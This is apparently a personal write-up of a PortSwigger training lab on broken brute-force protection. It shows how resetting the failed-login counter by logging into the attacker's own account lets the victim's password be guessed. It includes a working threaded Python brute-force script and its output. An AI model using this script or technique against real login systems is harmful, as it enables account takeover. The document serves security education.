# Broken brute-force protection, IP block

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block), you'll learn: Broken brute-force protection, IP block! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★☆☆☆☆☆☆☆☆

## Background

This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.

-   Your credentials: `wiener:peter`
-   Victim's username: `carlos`
-   [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

## Exploitation

**Login page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-6/images/Pasted%20image%2020221221083117.png)

**Let's try to type `carlos`'s password incorrectly multiple times and see what happend:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-6/images/Pasted%20image%2020221221083224.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-6/images/Pasted%20image%2020221221083239.png)

When we typed a valid username and **an incorrect password, it displays `Incorrect password`.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-6/images/Pasted%20image%2020221221083330.png)

When we typed an incorrect password 4 times, it'll block our IP.

**To bypass that, I'll add a HTTP header called `X-Forwarded-For`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-6/images/Pasted%20image%2020221221083432.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-6/images/Pasted%20image%2020221221083622.png)

No luck.

**How about we type incorrect password twice, then login as user `wiener`?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-6/images/Pasted%20image%2020221221084237.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-6/images/Pasted%20image%2020221221084249.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-6/images/Pasted%20image%2020221221084258.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-6/images/Pasted%20image%2020221221084315.png)

We successfully bypassed that!

**To brute force `carlos` password, I'll write a python script:**
```py
#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep

def fetchPassword(filename):
    listPassword = list()

    with open(filename) as fd:
        for line in fd:
            listPassword.append(line.strip())

    return listPassword

def sendRequest(url, cookie, password):
    carlosLoginData = {
        'username': 'carlos',
        'password': password
    }

    loginRequestText = requests.post(url, cookies=cookie, data=carlosLoginData).text

    if 'Incorrect password' not in loginRequestText:
        print(f'[+] Found password: {password}')

def loginRequest(url, cookie):
    wienerLoginData = {
        'username': 'wiener',
        'password': 'peter'
    }

    requests.post(url, cookies=cookie, data=wienerLoginData)

def main():
    url = 'https://0a84002a04a52b41c1d2ad230038003c.web-security-academy.net/login'
    cookie = {'session': 'Cq005y0KwJZYOigpmKSQPxrTay0VWfgu'}

    passwordFileName = './auth_password.txt'
    listPassword = fetchPassword(passwordFileName)
    
    counter = 0

    for password in listPassword:
        counter += 1

        if counter == 2:
            counter = 0
            loginRequest(url, cookie)

        thread = Thread(target=sendRequest, args=(url, cookie, password))
        thread.start()
        sleep(0.2)

if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Authentication]
└─# python3 enum_password_bypass.py
[+] Found password: superman
```

- Found user `carlos` password: `superman`

**Let's login as user `carlos`!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-6/images/Pasted%20image%2020221221090827.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-6/images/Pasted%20image%2020221221090834.png)

We're user `carlos`!

# What we've learned:

1. Broken brute-force protection, IP block